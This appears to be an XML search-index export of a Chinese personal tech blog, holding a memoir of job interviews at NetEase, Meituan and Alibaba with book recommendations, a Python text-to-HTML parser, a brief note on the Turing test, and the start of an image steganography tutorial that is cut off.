&#x4E8C;&#x9762;&#xFF1A;&#x9762;&#x8BD5;&#x5B98;&#x8FD8;&#x662F;&#x719F;&#x4EBA;&#xFF0C;&#x4F9D;&#x7136;&#x95EE;&#x9879;&#x76EE;&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x7684;&#x5B9E;&#x73B0;&#xFF0C;&#x81EA;&#x5DF1;&#x5E73;&#x53F0;&#x7684;&#x4F18;&#x52BF;&#x548C;&#x7F3A;&#x70B9;&#xFF0C;&#x8BBE;&#x8BA1;&#x601D;&#x60F3;&#x3002;ansible/saltstack&#x7684;&#x6BD4;&#x8F83;&#xFF1B;&#x4ECE;&#x5404;&#x4E2A;&#x8FD0;&#x7EF4;&#x5DE5;&#x5177;&#x7684;&#x8BBE;&#x8BA1;&#x601D;&#x60F3;&#x7EC4;&#x4EF6;&#xFF0C;&#x7ED9;&#x8BB2;&#x4E86;&#xFF1B;&#x7136;&#x540E;&#x5C31;&#x8BA9;&#x6211;&#x95EE;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x5C31;&#x8BF4;&#x6211;&#x8FD8;&#x8981;&#x5B66;&#x4E60;&#x4EC0;&#x4E48;&#xFF0C;&#x8FD8;&#x6709;&#x4EC0;&#x4E48;&#x7F3A;&#x70B9;&#x3002;&#x9762;&#x8BD5;&#x5B98;&#x8BF4;&#x6211;&#x5728;&#x8FD0;&#x7EF4;&#x8FD9;&#x4E00;&#x5757;&#x5F88;&#x4F18;&#x79C0;&#xFF0C;&#x62C5;&#x5FC3;&#x6211;&#x57FA;&#x7840;&#xFF08;&#x975E;&#x4E13;&#x4E1A;&#xFF09;&#xFF1B;&#x7136;&#x540E;&#x6211;&#x5C31;&#x8BF4;&#x81EA;&#x5DF1;&#x5B66;&#x4E86;&#x4EC0;&#x4E48;&#x4E1C;&#x897F;&#xFF0C;&#x8BB2;&#x4E86;&#x81EA;&#x5DF1;&#x5B66;&#x4E60;&#x7684;&#x4E1C;&#x897F;&#x3002;&#x8BF4;&#x4E86;&#x4E00;&#x4E2A;&#x5C0F;&#x65F6;&#x591A;&#x5427;&#xFF0C;&#x9762;&#x8BD5;&#x5B98;&#x8054;&#x7CFB;&#x4E86;hr&#xFF0C;&#x7ED9;&#x6211;&#x5B89;&#x6392;&#x6700;&#x540E;&#x4E00;&#x8F6E;&#x9762;&#x8BD5;&#x3002;&#x7B49;&#x5230;7&#x70B9;&#x591A;&#xFF0C;hr&#x901A;&#x77E5;&#x6211;&#x53BB;&#x9762;&#x8BD5;&#x3002; hr&#x9762;&#xFF1A;&#x538B;&#x529B;&#x9762;&#xFF0C;&#x5F88;&#x4E25;&#x8083;&#xFF0C;&#x95EE;&#x4E86;&#x5F88;&#x591A;&#x95EE;&#x9898;&#xFF0C;&#x5BF9;&#x6211;&#x5F88;&#x8D28;&#x7591;&#xFF0C;&#x6700;&#x540E;&#x5BF9;&#x6211;&#x8BF4;&#xFF0C;&#x524D;&#x9762;&#x4E24;&#x8F6E;&#x9762;&#x8BD5;&#x5B98;&#x5BF9;&#x6211;&#x8BC4;&#x4EF7;&#x5F88;&#x597D;&#xFF0C;&#x5979;&#x8981;&#x8003;&#x8651;&#x4E0B;&#xFF0C;&#x4E0B;&#x5468;&#x7ED9;&#x7B54;&#x590D;&#x3002; &#x8D70;&#x51FA;&#x7F51;&#x6613;&#x5927;&#x53A6;&#x65F6;&#xFF0C;&#x5DEE;&#x4E0D;&#x591A;&#x662F;8&#x70B9;&#x4E86;&#xFF0C;&#x56DE;&#x5230;&#x4F4F;&#x7684;&#x5730;&#x65B9;10&#x70B9;&#x591A;&#xFF0C;&#x5403;&#x4E86;&#x70B9;&#x996D;&#xFF0C;&#x7761;&#x89C9;&#x3002;&#x7B2C;&#x4E8C;&#x5929;&#xFF0C;&#x56DE;&#x897F;&#x5B89;&#x3002; &#x5468;&#x4E00;&#x4E0A;&#x8BFE;&#x65F6;&#xFF0C;9&#x70B9;&#x5DE6;&#x53F3;&#xFF0C;&#x624B;&#x673A;&#x9707;&#x52A8;&#xFF0C;&#x5FC3;&#x4E2D;&#x6709;&#x9884;&#x611F;&#xFF0C;&#x8D76;&#x7D27;&#x51FA;&#x6559;&#x5BA4;&#xFF0C;&#x7F51;&#x6613;hr&#x6253;&#x7684;&#x7535;&#x8BDD;&#x3002;&#x7F51;&#x6613;&#x6E38;&#x620F;&#x4E00;&#x9762;&#xFF1A; &#x7535;&#x8BDD;&#x9762;&#xFF0C;&#x4E24;&#x4E2A;&#x9762;&#x8BD5;&#x5B98;&#xFF0C;&#x5F88;nice&#x3002;&#x4E0A;&#x6765;&#x5C31;&#x95EE;tcp&#xFF0C;&#x628A;tcp&#x95EE;&#x4E86;&#x4E2A;&#x904D;&#xFF0C;&#x8FD8;&#x95EE;&#x4E86;linux&#x5185;&#x6838;3.0&#x4EE5;&#x540E;&#xFF0C;&#x5BF9;tcp&#x534F;&#x8BAE;&#x652F;&#x6301;&#xFF08;&#x5230;&#x73B0;&#x5728;&#x8FD8;&#x4E0D;&#x4F1A;&#xFF09;,vlan/vxlan&#xFF0C;&#x4E4B;&#x540E;&#x5C31;&#x662F;&#x5185;&#x6838;&#x53C2;&#x6570;&#xFF0C;&#x8FDB;&#x7A0B;vs&#x7EBF;&#x7A0B;&#xFF0C;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF0C;&#x9879;&#x76EE;&#xFF0C;&#x6211;&#x7684;github,&#x535A;&#x5BA2;&#x3002;&#x81EA;&#x5DF1;&#x4EE5;&#x4E3A;&#x6302;&#x4E86;&#xFF0C;&#x4E4B;&#x540E;&#x5341;&#x4E00;&#x524D;&#x6253;&#x7535;&#x8BDD;&#xFF0C;&#x901A;&#x77E5;&#x53BB;&#x5317;&#x4EAC;&#x9762;&#x8BD5;&#xFF0C;&#x672C;&#x6765;&#x60F3;&#x62D2;&#x7EDD;&#xFF0C;&#x4F46;&#x5305;&#x673A;&#x7968;&#xFF0C;&#x5C31;&#x7B54;&#x5E94;&#x4E86;&#x3002; &#x4E8C;&#x9762;&#xFF1A;&#x73B0;&#x573A;&#x9762;&#xFF0C;&#x9879;&#x76EE;&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x5DE5;&#x5177;&#x7684;&#x6BD4;&#x8F83;&#xFF08;&#x7B54;&#x7684;&#x5F88;&#x5DEE;&#xFF0C;&#x7136;&#x540E;&#x9762;&#x8BD5;&#x5B98;&#x8BF4;&#x4E86;&#x8981;&#x4ECE;&#x8BBE;&#x8BA1;&#x601D;&#x8DEF;&#xFF0C;&#x7EC4;&#x4EF6;&#x65B9;&#x9762;&#x56DE;&#x7B54;&#xFF0C;&#x4E0B;&#x5348;&#x7F51;&#x6613;&#x9762;&#x8BD5;&#x7528;&#x4E0A;&#x4E86;&#xFF09;&#x3002;&#x5728;&#x6211;&#x63A5;&#x53D7;&#x4E86;&#x7F51;&#x6613;offer&#x540E;&#xFF0C;&#x628A;&#x4E09;&#x65B9;&#x90AE;&#x8FC7;&#x53BB;&#x540E;&#xFF0C;&#x7F51;&#x6613;&#x6E38;&#x620F;&#x518D;&#x6B21;&#x7EA6;&#x6211;&#x9762;&#x8BD5;&#x3002; &#x7F8E;&#x56E2;&#x9009;&#x62E9;&#x4E86;&#x7F8E;&#x56E2;&#xFF0C;&#x9519;&#x8FC7;&#x4E86;&#x767E;&#x5EA6;&#x548C;&#x641C;&#x72D7;&#xFF1B;&#x4F46;&#x7F8E;&#x56E2;&#x4F9D;&#x65E7;&#x62D2;&#x7EDD;&#x4E86;&#x6211;&#x3002; &#x4E00;&#x9762;&#xFF1A; 11&#x70B9;40&#x591A;&#x9762;&#x8BD5;&#xFF0C;&#x5C31;&#x95EE;&#x4E86;&#x4E24;&#x4E2A;&#x7B97;&#x6CD5;&#x3002; &#x4E8C;&#x9762;&#xFF1A; &#x7F51;&#x7EDC;&#xFF0C;mysql&#x7684;&#x4E8B;&#x52A1;&#xFF0C;&#x667A;&#x529B;&#x9898; &#x4E09;&#x9762;&#xFF1A; &#x9879;&#x76EE;&#xFF0C;linux&#x57FA;&#x7840;&#x8003;&#x5BDF; hr&#xFF1A;&#x963F;&#x91CC;&#x6708;&#x997C; &#x5B66;&#x4E60;&#x5386;&#x7A0B;&#x4E2A;&#x4EBA;&#x5B66;&#x4E60;&#x63A5;&#x89E6;&#x8BA1;&#x7B97;&#x673A;&#x65B9;&#x9762;&#x77E5;&#x8BC6;&#x662F;&#x5728;&#x5927;&#x4E00;&#xFF0C;&#x5F53;&#x65F6;&#x53EA;&#x662F;&#x4E3A;&#x4E86;&#x8003;&#x4E2A;&#x4E8C;&#x7EA7;&#xFF0C;&#x83AB;&#x540D;&#x5176;&#x5999;&#x7684;&#x5165;&#x5751;&#x3002;&#x4ECE;&#x5927;&#x4E00;&#x5B66;&#x4E60;c&#x8BED;&#x8A00;&#x5427;&#xFF0C;&#x5F53;&#x65F6;&#x770B;&#x7684;&#x662F;&#x8C2D;&#x6D69;&#x5F3A;&#x7684;&#x4E66;&#xFF0C;&#x52C9;&#x5F3A;&#x5165;&#x95E8;&#x5427;&#xFF0C;&#x4E4B;&#x540E;&#x4E5F;&#x5C31;&#x770B;&#x4E86;&#x300A;c&#x4E0E;&#x6307;&#x9488;&#x300B;&#x4E4B;&#x7C7B;&#x7684;&#x4E66;&#x3002;&#x5927;&#x4E00;&#x6691;&#x5047;&#x5F00;&#x59CB;&#x5B66;C ,&#x770B;&#x4E86;&#x4E00;&#x4E9B;C &#x65B9;&#x9762;&#x7684;&#x4E66;&#xFF0C;&#x300A;C primer&#x300B;&#xFF0C;&#x300A;&#x7F16;&#x7A0B;&#x601D;&#x60F3;&#x300B;&#xFF0C;&#x300A;c &#x6C89;&#x601D;&#x5F55;&#x300B;&#xFF0C;&#x8FD8;&#x6709;&#x5BF9;&#x6211;&#x5F88;&#x6709;&#x5F71;&#x54CD;&#x7684;&#x300A;STL&#x6E90;&#x7801;&#x5256;&#x6790;&#x300B;&#x3002;&#x90A3;&#x65F6;&#x5019;&#xFF0C;&#x5BF9;&#x963F;&#x91CC;&#x6709;&#x79CD;&#x5411;&#x5F80;&#xFF0C;&#x60F3;&#x8FDB;&#x963F;&#x91CC;&#xFF0C;&#x7136;&#x540E;&#x5F00;&#x59CB;&#x5B66;java&#xFF0C;&#x4E5F;&#x770B;&#x4E86;&#x5F88;&#x591A;&#x4E66;&#xFF0C;&#x300A;java&#x7F16;&#x7A0B;&#x601D;&#x60F3;&#x300B;&#xFF0C;&#x300A;java web&#x5F00;&#x53D1;-&#x738B;&#x8005;&#x5F52;&#x6765;&#x300B;&#x4E4B;&#x7C7B;&#x7684;&#x3002;&#x7136;&#x540E;&#x5927;&#x4E8C;&#x5F00;&#x59CB;&#x6295;&#x4E86;&#x963F;&#x91CC;&#x548C;&#x817E;&#x8BAF;&#x3002;&#x817E;&#x8BAF;&#x8FDE;&#x7B14;&#x8BD5;&#x90FD;&#x6CA1;&#x8FC7;&#xFF0C;&#x963F;&#x91CC;&#x5C31;&#x9762;&#x4E86;&#x4E2A;java&#xFF0C;&#x5230;&#x4E8C;&#x9762;&#x6302;&#x4E86;&#xFF0C;&#x5F53;&#x65F6;&#x9887;&#x53D7;&#x6253;&#x51FB;&#x3002;&#x5F53;&#x65F6;&#x7B14;&#x8BD5;&#x9898;&#x6709;&#x597D;&#x591A;linux&#x7684;&#xFF0C;&#x7136;&#x540E;&#x5927;&#x4E8C;&#x6691;&#x5047;&#x5C31;&#x5F00;&#x59CB;&#x5B66;linux&#xFF0C;&#x4E00;&#x5F00;&#x59CB;&#x770B;&#x5B8C;&#x4E86;&#x300A;&#x9E1F;&#x54E5;&#x7684;linux&#x79C1;&#x623F;&#x83DC;&#x300B;&#xFF0C;&#x4E4B;&#x540E;&#x53C8;&#x662F;&#x5404;&#x79CD;linux&#x4E66;&#x7C4D;&#xFF0C;&#x5B66;shell&#xFF0C;&#x770B;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x770B;&#x67B6;&#x6784;&#x3002;&#x9009;&#x62E9;&#x8FD0;&#x7EF4;&#x662F;&#x4E2A;&#x610F;&#x5916;&#xFF0C;&#x4F46;&#x4E5F;&#x662F;&#x4E00;&#x79CD;&#x9003;&#x907F;&#x5427;&#x3002;&#x5927;&#x4E09;&#x4E00;&#x5E74;&#x5C31;&#x5728;linux&#x4E2D;&#x6323;&#x624E;&#xFF0C;&#x5F88;&#x75DB;&#x82E6;&#x3002;linux&#x5B66;&#x4E60;&#x4E2D;&#x53D1;&#x73B0;&#x8FD0;&#x7EF4;&#x7684;&#x9762;&#x5F88;&#x5E7F;&#xFF0C;&#x81EA;&#x5DF1;&#x5C31;&#x9009;&#x4E86;devops&#xFF0C;&#x770B;&#x4E86;&#x5F88;&#x591A;&#xFF0C;&#x4E5F;&#x5B66;&#x4E60;&#x4E86;&#x5F88;&#x591A;&#x3002;&#x4E66;&#x7C4D;&#x63A8;&#x8350;linux&#x9E1F;&#x54E5;&#x79C1;&#x623F;&#x83DC; &#x300A; Linux &#x5185;&#x6838;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B; &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;(&#x7B2C;2&#x7248;)&#x300B; linux&#x5C31;&#x662F;&#x8FD9;&#x4E2A;&#x8303;&#x513F; &#x300A;Linux&#x4E0E;Unix Shell &#x7F16;&#x7A0B;&#x6307;&#x5357;&#x300B; &#x300A;unix&#x73AF;&#x5883;&#x9AD8;&#x7EA7;&#x7F16;&#x7A0B;&#x7B2C;&#x4E8C;&#x7248;&#x300B;&#x300A;unix&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B; &#x5B98;&#x65B9;&#x6587;&#x6863; &#x7F51;&#x7EDC;TCP&#x534F;&#x8BAE;&#x65CF; TCP&#x8BE6;&#x89E3;&#xFF08;1&#xFF0C;2&#xFF0C;3&#xFF09; &#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x73B0;&#x4EE3;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF; &#x6DF1;&#x5165;&#x7406;&#x89E3;&#x8BA1;&#x7B97;&#x673A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF; &#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x6982;&#x5FF5; &#x5927;&#x6570;&#x636E;hadoop&#x6838;&#x5FC3;&#x6280;&#x672F; Hadoop&#x6743;&#x5A01;&#x6307;&#x5357; &#x300A;Hadoop&#x6280;&#x672F;&#x5185;&#x5E55;-&#x6DF1;&#x5165;&#x89E3;&#x6790;MapReduce&#x67B6;&#x6784;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x539F;&#x7406;&#x300B;&#x548C;&#x300A;Hadoop&#x6280;&#x672F;&#x5185;&#x5E55;-&#x6DF1;&#x5165;&#x89E3;&#x6790;Hadoop Common&#x548C;HDFS&#x67B6;&#x6784;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x539F;&#x7406;&#x300B; &#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;python&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4; saltstack&#x6280;&#x672F;&#x5165;&#x95E8;&#x4E0E;&#x5B9E;&#x6218; ansible&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4; &#x5927;&#x516C;&#x53F8;&#x5F88;&#x770B;&#x91CD;&#x57FA;&#x7840;&#xFF0C;&#x591A;&#x770B;&#x770B;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#xFF0C;&#x7F51;&#x7EDC;&#x3002; &#x672A;&#x5B8C;&#x5F85;&#x7EED; &#x770B;&#x8FC7;&#x4E4B;&#x540E;&#x611F;&#x89C9;&#x81EA;&#x5DF1;&#x771F;&#x7684;&#x5F88;&#x5F31;&#xFF0C;&#x8981;&#x52AA;&#x529B;&#x7684;&#x5730;&#x65B9;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x2026;&#x2026; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>life</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python text parser]]></title>
    <url>%2F2018%2F10%2F16%2FPython-text-parser%2F</url>
    <content type="text"><![CDATA[util.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#!/usr/bin/python# encoding: utf-8class Rule: &quot;&quot;&quot; &#x89C4;&#x5219;&#x7236;&#x7C7B; &quot;&quot;&quot; def action(self, block, handler): &quot;&quot;&quot; &#x52A0;&#x6807;&#x8BB0; &quot;&quot;&quot; handler.start(self.type) handler.feed(block) handler.end(self.type) return Trueclass HeadingRule(Rule): &quot;&quot;&quot; &#x4E00;&#x53F7;&#x6807;&#x9898;&#x89C4;&#x5219; &quot;&quot;&quot; type = &apos;heading&apos; def condition(self, block): &quot;&quot;&quot; &#x5224;&#x65AD;&#x6587;&#x672C;&#x5757;&#x662F;&#x5426;&#x7B26;&#x5408;&#x89C4;&#x5219; &quot;&quot;&quot; return not &apos;\n&apos; in block and len(block) &lt;= 70 and not block[-1] == &apos;:&apos;class TitleRule(HeadingRule): &quot;&quot;&quot; &#x4E8C;&#x53F7;&#x6807;&#x9898;&#x89C4;&#x5219; &quot;&quot;&quot; type = &apos;title&apos; first = True def condition(self, block): if not self.first: return False self.first = False return HeadingRule.condition(self, block);class ListItemRule(Rule): &quot;&quot;&quot; &#x5217;&#x8868;&#x9879;&#x89C4;&#x5219; &quot;&quot;&quot; type = &apos;listitem&apos; def condition(self, block): return block[0] == &apos;-&apos; def action(self, block, handler): handler.start(self.type) handler.feed(block[1:].strip()) handler.end(self.type) return Trueclass ListRule(ListItemRule): &quot;&quot;&quot; &#x5217;&#x8868;&#x89C4;&#x5219; &quot;&quot;&quot; type = &apos;list&apos; inside = False def condition(self, block): return True def action(self, block, handler): if not self.inside and ListItemRule.condition(self, block): handler.start(self.type) self.inside = True elif self.inside and not ListItemRule.condition(self, block): handler.end(self.type) self.inside = False return Falseclass ParagraphRule(Rule): &quot;&quot;&quot; &#x6BB5;&#x843D;&#x89C4;&#x5219; &quot;&quot;&quot; type = &apos;paragraph&apos; def condition(self, block): return True headlers.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#!/usr/bin/python# encoding: utf-8class Handler: &quot;&quot;&quot; &#x5904;&#x7406;&#x7A0B;&#x5E8F;&#x7236;&#x7C7B; &quot;&quot;&quot; def callback(self, prefix, name, *args): method = getattr(self, prefix + name, None) if callable(method): return method(*args) def start(self, name): self.callback(&apos;start_&apos;, name) def end(self, name): self.callback(&apos;end_&apos;, name) def sub(self, name): def substitution(match): result = self.callback(&apos;sub_&apos;, name, match) if result is None: result = match.group(0) return result return substitutionclass HTMLRenderer(Handler): &quot;&quot;&quot; HTML&#x5904;&#x7406;&#x7A0B;&#x5E8F;,&#x7ED9;&#x6587;&#x672C;&#x5757;&#x52A0;&#x76F8;&#x5E94;&#x7684;HTML&#x6807;&#x8BB0; &quot;&quot;&quot; def start_document(self): print(&apos;&lt;html&gt;&lt;head&gt;&lt;title&gt;ShiYanLou&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&apos;) def end_document(self): print(&apos;&lt;/body&gt;&lt;/html&gt;&apos;) def start_paragraph(self): print(&apos;&lt;p style=&quot;color: #444;&quot;&gt;&apos;) def end_paragraph(self): print(&apos;&lt;/p&gt;&apos;) def start_heading(self): print(&apos;&lt;h2 style=&quot;color: #68BE5D;&quot;&gt;&apos;) def end_heading(self): print(&apos;&lt;/h2&gt;&apos;) def start_list(self): print(&apos;&lt;ul style=&quot;color: #363736;&quot;&gt;&apos;) def end_list(self): print(&apos;&lt;/ul&gt;&apos;) def start_listitem(self): print(&apos;&lt;li&gt;&apos;) def end_listitem(self): print(&apos;&lt;/li&gt;&apos;) def start_title(self): print(&apos;&lt;h1 style=&quot;color: #1ABC9C;&quot;&gt;&apos;) def end_title(self): print(&apos;&lt;/h1&gt;&apos;) def sub_emphasis(self, match): return(&apos;&lt;em&gt;%s&lt;/em&gt;&apos; % match.group(1)) def sub_url(self, match): return(&apos;&lt;a target=&quot;_blank&quot; style=&quot;text-decoration: none;color: #BC1A4B;&quot; href=&quot;%s&quot;&gt;%s&lt;/a&gt;&apos; % (match.group(1), match.group(1))) def sub_mail(self, match): return(&apos;&lt;a style=&quot;text-decoration: none;color: #BC1A4B;&quot; href=&quot;mailto:%s&quot;&gt;%s&lt;/a&gt;&apos; % (match.group(1), match.group(1))) def feed(self, data): print(data) rules.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#!/usr/bin/python# encoding: utf-8class Rule: &quot;&quot;&quot; &#x89C4;&#x5219;&#x7236;&#x7C7B; &quot;&quot;&quot; def action(self, block, handler): &quot;&quot;&quot; &#x52A0;&#x6807;&#x8BB0; &quot;&quot;&quot; handler.start(self.type) handler.feed(block) handler.end(self.type) return Trueclass HeadingRule(Rule): &quot;&quot;&quot; &#x4E00;&#x53F7;&#x6807;&#x9898;&#x89C4;&#x5219; &quot;&quot;&quot; type = &apos;heading&apos; def condition(self, block): &quot;&quot;&quot; &#x5224;&#x65AD;&#x6587;&#x672C;&#x5757;&#x662F;&#x5426;&#x7B26;&#x5408;&#x89C4;&#x5219; &quot;&quot;&quot; return not &apos;\n&apos; in block and len(block) &lt;= 70 and not block[-1] == &apos;:&apos;class TitleRule(HeadingRule): &quot;&quot;&quot; &#x4E8C;&#x53F7;&#x6807;&#x9898;&#x89C4;&#x5219; &quot;&quot;&quot; type = &apos;title&apos; first = True def condition(self, block): if not self.first: return False self.first = False return HeadingRule.condition(self, block);class ListItemRule(Rule): &quot;&quot;&quot; &#x5217;&#x8868;&#x9879;&#x89C4;&#x5219; &quot;&quot;&quot; type = &apos;listitem&apos; def condition(self, block): return block[0] == &apos;-&apos; def action(self, block, handler): handler.start(self.type) handler.feed(block[1:].strip()) handler.end(self.type) return Trueclass ListRule(ListItemRule): &quot;&quot;&quot; &#x5217;&#x8868;&#x89C4;&#x5219; &quot;&quot;&quot; type = &apos;list&apos; inside = False def condition(self, block): return True def action(self, block, handler): if not self.inside and ListItemRule.condition(self, block): handler.start(self.type) self.inside = True elif self.inside and not ListItemRule.condition(self, block): handler.end(self.type) self.inside = False return Falseclass ParagraphRule(Rule): &quot;&quot;&quot; &#x6BB5;&#x843D;&#x89C4;&#x5219; &quot;&quot;&quot; type = &apos;paragraph&apos; def condition(self, block): return True markup.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#!/usr/bin/python# encoding: utf-8import sys, refrom handlers import *from util import *from rules import *class Parser: &quot;&quot;&quot; &#x89E3;&#x6790;&#x5668;&#x7236;&#x7C7B; &quot;&quot;&quot; def __init__(self, handler): self.handler = handler self.rules = [] self.filters = [] def addRule(self, rule): &quot;&quot;&quot; &#x6DFB;&#x52A0;&#x89C4;&#x5219; &quot;&quot;&quot; self.rules.append(rule) def addFilter(self, pattern, name): &quot;&quot;&quot; &#x6DFB;&#x52A0;&#x8FC7;&#x6EE4;&#x5668; &quot;&quot;&quot; def filter(block, handler): return re.sub(pattern, handler.sub(name), block) self.filters.append(filter) def parse(self, file): &quot;&quot;&quot; &#x89E3;&#x6790; &quot;&quot;&quot; self.handler.start(&apos;document&apos;) for block in blocks(file): for filter in self.filters: block = filter(block, self.handler) for rule in self.rules: if rule.condition(block): last = rule.action(block, self.handler) if last: break self.handler.end(&apos;document&apos;)class BasicTextParser(Parser): &quot;&quot;&quot; &#x7EAF;&#x6587;&#x672C;&#x89E3;&#x6790;&#x5668; &quot;&quot;&quot; def __init__(self, handler): Parser.__init__(self, handler) self.addRule(ListRule()) self.addRule(ListItemRule()) self.addRule(TitleRule()) self.addRule(HeadingRule()) self.addRule(ParagraphRule()) self.addFilter(r&apos;\*(.+?)\*&apos;, &apos;emphasis&apos;) self.addFilter(r&apos;(http://[\.a-zA-Z/]+)&apos;, &apos;url&apos;) self.addFilter(r&apos;([\.a-zA-Z]+@[\.a-zA-Z]+[a-zA-Z]+)&apos;, &apos;mail&apos;)&quot;&quot;&quot;&#x8FD0;&#x884C;&#x7A0B;&#x5E8F;&quot;&quot;&quot;handler = HTMLRenderer()parser = BasicTextParser(handler)parser.parse(sys.stdin) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Turing machine and Turing test]]></title>
    <url>%2F2018%2F10%2F11%2FTuring-machine-and-Turing-test%2F</url>
    <content type="text"><![CDATA[&#x81EA;&#x5DF1;&#x5C0F;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x559C;&#x6B22;&#x601D;&#x8003;&#x751F;&#x4E0E;&#x6B7B;&#x8FD9;&#x6837;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x6709;&#x65F6;&#x5019;&#x8FD8;&#x4F1A;&#x5E7B;&#x60F3;&#x81EA;&#x5DF1;&#x80FD;&#x4E0D;&#x80FD;&#x957F;&#x751F;&#x4E0D;&#x6B7B;&#xFF0C;&#x73B0;&#x5728;&#x60F3;&#x60F3;&#x90A3;&#x65F6;&#x5019;&#x80FD;&#x591F;&#x8FD9;&#x6837;&#x60F3;&#x662F;&#x591A;&#x4E48;&#x7684;&#x5E78;&#x798F;&#xFF0C;&#x800C;&#x73B0;&#x5728;&#x6709;&#x8FD9;&#x6837;&#x7684;&#x60F3;&#x6CD5;&#x662F;&#x591A;&#x4E48;&#x7684;&#x5962;&#x4F88;&#x2026;&#x2026; &#x56FE;&#x7075;&#x6D4B;&#x8BD5;&#xFF1A; &#x5982;&#x679C;&#x4E00;&#x4E2A;&#x4EBA;&#xFF08;&#x4EE3;&#x53F7;C&#xFF09;&#x4F7F;&#x7528;&#x6D4B;&#x8BD5;&#x5BF9;&#x8C61;&#x7686;&#x7406;&#x89E3;&#x7684;&#x8BED;&#x8A00;&#x53BB;&#x8BE2;&#x95EE;&#x4E24;&#x4E2A;&#x4ED6;&#x4E0D;&#x80FD;&#x770B;&#x89C1;&#x7684;&#x5BF9;&#x8C61;&#x4EFB;&#x610F;&#x4E00;&#x4E32;&#x95EE;&#x9898;&#x3002;&#x5BF9;&#x8C61;&#x4E3A;&#xFF1A;&#x4E00;&#x4E2A;&#x662F;&#x6B63;&#x5E38;&#x601D;&#x7EF4;&#x7684;&#x4EBA;&#xFF08;&#x4EE3;&#x53F7;B&#xFF09;&#x3001;&#x4E00;&#x4E2A;&#x662F;&#x673A;&#x5668;&#xFF08;&#x4EE3;&#x53F7;A&#xFF09;&#x3002;&#x5982;&#x679C;&#x7ECF;&#x8FC7;&#x82E5;&#x5E72;&#x8BE2;&#x95EE;&#x4EE5;&#x540E;&#xFF0C;C&#x4E0D;&#x80FD;&#x5F97;&#x51FA;&#x5B9E;&#x8D28;&#x7684;&#x533A;&#x522B;&#x6765;&#x5206;&#x8FA8;A&#x4E0E;B&#x7684;&#x4E0D;&#x540C;&#xFF0C;&#x5219;&#x6B64;&#x673A;&#x5668;A&#x901A;&#x8FC7;&#x56FE;&#x7075;&#x6D4B;&#x8BD5;&#x3002; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python3 image steganography]]></title>
    <url>%2F2018%2F10%2F11%2FPython3-image-steganography%2F</url>
    <content type="text"><![CDATA[&#x5927;&#x81F4;&#x5206;&#x6790;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x5730;&#x65B9;&#x6CA1;&#x6709;&#x5F04;&#x660E;&#x767D;&#x3002; code:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from PIL import Image&quot;&quot;&quot;&#x53D6;&#x5F97;&#x4E00;&#x4E2A; PIL &#x56FE;&#x50CF;&#x5E76;&#x4E14;&#x66F4;&#x6539;&#x6240;&#x6709;&#x503C;&#x4E3A;&#x5076;&#x6570;&#xFF08;&#x4F7F;&#x6700;&#x4F4E;&#x6709;&#x6548;&#x4F4D;&#x4E3A; 0&#xFF09;&quot;&quot;&quot;def makeImageEven(image): pixels = list(image.getdata()) # &#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x8FD9;&#x6837;&#x7684;&#x5217;&#x8868;&#xFF1A; [(r,g,b,t),(r,g,b,t)...] 